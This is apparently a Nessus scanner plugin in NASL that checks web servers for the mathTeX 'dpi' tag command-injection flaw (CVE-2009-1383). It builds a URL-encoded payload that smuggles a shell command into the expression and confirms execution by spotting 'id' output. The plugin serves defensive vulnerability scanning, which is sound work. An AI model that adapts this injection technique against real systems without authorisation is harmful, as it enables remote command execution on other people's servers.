#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(49778);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2016/11/19 01:42:51 $");

  script_cve_id("CVE-2009-1383");
  script_bugtraq_id(43599);
  script_osvdb_id(56100);

  script_name(english:"mathTeX mathtex.cgi getdirective Function dpi Tag Arbitrary Code Execution");
  script_summary(english:"Tries to run a command");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a CGI script that allows execution of
arbitrary commands."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote web server hosts mathTeX, a CGI script for displaying math
on the web.

The version of this application installed on the remote host fails to
sanitize input via the 'dpi' or 'density' tags in an expression of
shell metacharacters in the 'getdirective' function before using it
in a call to the Perl 'system()' function.

An unauthenticated, remote attacker can leverage this issue to execute
arbitrary code on the remote host subject to the privileges under
which the web server operates."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.ocert.org/advisories/ocert-2009-010.html");
  script_set_attribute(
    attribute:"see_also",
    value:"http://seclists.org/bugtraq/2009/Jul/75"
  );
  script_set_attribute(
    attribute:"see_also",
    value:"http://www.nessus.org/u?42c77120"
  );
  script_set_attribute(attribute:"solution", value:"Upgrade to a version of mathTeX released on or after July 13th, 2009.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"false");
 script_cwe_id(78);

  script_set_attribute(attribute:"vuln_publication_date", value:"2009/05/25");
  script_set_attribute(attribute:"patch_publication_date", value:"2009/05/26");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/10/06");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");


port = get_http_port(default:80);


cmd = 'id';
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";

magic = SCRIPT_NAME + '-' + unixtime();
find_file = 'ps ax | ' +
            'fgrep "' + magic + '" | ' +
            'egrep "/[0-9a-fA-F]+\\.gif" | ' +
            'tail -1 | ' +
            'sed -n -e \'s/.*dvips.ps //\' -e \'s/gif >convert.*/gif/p\' | tee /tmp/foo4';

exploit = cmd + ' > $(' + find_file + ') | echo ' + magic + ' ';
expr = "\dvips" +
       "\dpi{150|" + urlencode(str:exploit) + "}";


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/mathtex", "/cgi-bin/mathtex", cgi_dirs()));
else dirs = make_list(cgi_dirs());

output = "";
mathtex_installs = 0;
vuln_urls = make_list();

foreach dir (dirs)
{
  foreach ext (make_list(".cgi", ".pl"))
  {
    url = dir + '/mathtex' + ext + '?' + expr;

    res = http_send_recv3(port:port, method:"GET", item:url, exit_on_fail:TRUE);
    if (!res[2]) continue;

    headers = parse_http_headers(status_line:res[0], headers:res[1]);
    if (isnull(headers)) exit(1, 'Error parsing HTTP headers on port '+port+'.');

    # If the output looks like it's from the script...
    content_type = headers['content_type'];
    if (headers['content-type'] && 'image/gif' >< headers['content-type'])
    {
      mathtex_installs++;
    }
    # otherwise continue unless we're being paranoid.
    else if (report_paranoia < 2)
    {
      continue;
    }

    if (egrep(pattern:cmd_pat, string:res[2]))
    {
      vuln_urls = make_list(vuln_urls, url);
      if (!output) output = res[2];

      break;
    }
  }
  if (output && !thorough_tests) break;
}

if (max_index(vuln_urls))
{
  if (report_verbosity > 0)
  {
    if (max_index(vuln_urls) == 1) s = '';
    else s = 's';
    header =
      "Nessus was able to execute the command '" + cmd + "' on the remote" + '\n' +
      'host using the following URL' + s;
    trailer = '';

    if (report_verbosity > 1)
    {
      trailer =
        'This produced the following output :\n' +
        '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        output +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        '\n';
    }
    trailer +=
      'Note that some browsers will try to render the response from the URL' + s + '\n' +
      'above as an image and display an error rather than command output.  If\n' +
      'this happens, try an alternate browser or send the request manually.\n';

    report = get_vuln_report(items:vuln_urls, port:port, header:header, trailer:trailer);
    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else
{
  if (mathtex_installs == 0) exit(0, "No installs of mathTeX were found on the web server on port "+port+".");
  else if (mathtex_installs == 1) exit(0, "The mathTeX install hosted on the web server on port "+port+" is not affected.");
  else exit(0, "The mathTeX installs hosted on the web server on port "+port+" are not affected.");
}
